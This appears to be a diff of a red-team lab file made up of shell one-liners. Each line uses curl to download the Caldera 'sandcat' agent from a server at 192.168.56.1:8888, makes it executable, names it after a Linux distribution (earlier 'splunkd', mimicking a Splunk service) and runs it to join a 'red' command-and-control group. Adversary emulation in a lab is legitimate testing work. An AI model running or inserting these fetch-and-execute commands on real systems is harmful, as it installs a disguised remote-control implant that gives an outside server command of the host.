@@ -1,1 +1,18 @@
-server="http://192.168.56.1:8888";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;chmod +x splunkd;./splunkd -server $server -group red -v
+server="http://192.168.56.1:8888";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > centOS;chmod +x centOS;./centOS -server $server -group red -v
+
+server="http://192.168.56.1:8888";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > debian;chmod +x debian;./debian -server $server -group red -v
+
+
+server="http://192.168.56.1:8888";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > ubuntu;chmod +x ubuntu;./ubuntu -server $server -group red -v
+
+
+server="http://192.168.56.1:8888";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > lubuntu;chmod +x lubuntu;./lubuntu -server $server -group red -v
+
+
+server="http://192.168.56.1:8888";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > kali;chmod +x kali;./kali -server $server -group red -v
+
+
+server="http://192.168.56.1:8888";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > fedora;chmod +x fedora;./fedora -server $server -group red -v
+
+
+
